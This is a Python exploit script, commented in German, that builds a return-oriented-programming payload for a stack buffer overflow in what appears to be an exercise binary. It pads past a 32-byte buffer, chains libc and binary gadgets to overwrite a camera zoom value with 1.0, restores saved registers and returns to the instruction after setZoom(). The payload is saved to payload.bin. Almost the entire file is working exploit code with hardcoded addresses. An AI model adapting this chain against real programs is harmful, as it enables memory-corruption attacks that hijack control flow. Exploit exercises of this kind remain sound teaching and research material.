#!/usr/bin/env python3
from pwn import *
import struct

def p64(val):
    """Packt einen 64-Bit-Wert im Little-Endian-Format."""
    return struct.pack("<Q", val)

# -----Adressen-----
# Basis-Adresse der Libary
basisLibary = 0x7ffff7600000 

# Gadget: pop rdi ; ret
pop_rdi_ret = 0x10f75b + basisLibary
rdi = 0x7fffffffd248 # Adresse von rdi vor Overflow

# Gadbget: pop rsi ; ret
pop_rsi_ret = 0x110a4d + basisLibary
rsi = 0x7fffffffd120 # Adresse von rdi vor Overflow

# Gadget: mov dword ptr [rdi], esi ; ret
mov_dword_ptr_rdi_esi_ret = 0x9c434 + basisLibary

# Gadget: pop rsi ; pop rbp ; ret
pop_rsi_pop_rbp_ret = 0x406b58 # Gadget ist von Haupt-Binary, deswegen keine Basis-Adresse
rbp = 0x7fffffffd420 # Adresse von rbp vor Overflow

# Adresse von Instruktion nach setZoom() Funktion
afterSetZoom = 0x4035a5

# Adresse von theCamera._zoom
theCamera_zoom = 0x7fffffffd1c0

# Bitmuster für 1.0 als 32-Bit Float (IEEE-754)
value_1_0 = 0x000000003F800000

# -----ROP-Chain-----
# 1.1 Mit "pop rdi ; ret" die Adresse von theCamera._zoom in rdi laden
# 1.2 Mit "pop rsi ; ret" den Wert 1.0 (als 32-Bit Float) in rsi laden
# 1.3 Mit "mov dword ptr [rdi], esi ; ret" wird aus rsi an der Adresse in rdi geschrieben
# 2. Adressen von rdi, rsi und rbp vor Overflow wiederherstellen
# 3. Zurück zur Instruktion nach setZoom()

payload = b"A" * 40 # 32 byte um char-Array zu überschreiben, 8 byte um rbp zu überschreiben

payload += p64(pop_rdi_ret)
payload += p64(theCamera_zoom) # rdi = Adresse von theCamera._zoom
payload += p64(pop_rsi_ret)
payload += p64(value_1_0) # rsi = 1.0 als 32-Bit Float
payload += p64(mov_dword_ptr_rdi_esi_ret) # rdi = esi (niederwertige Bytes von rsi) und somit theCamera._zoom = 1.0

payload += p64(pop_rdi_ret) 
payload += p64(rdi) # rdi = Adresse von rdi vor Overflow
payload += p64(pop_rsi_pop_rbp_ret) 
payload += p64(rsi) # rsi = Adresse von rsi vor Overflow
payload += p64(rbp) # rbp = Adresse von rbp vor Overflow

payload += p64(afterSetZoom) # return to afterSetZoom

# -----Payload in payload.bin speichern-----
with open("payload.bin", "wb") as f:
    f.write(payload)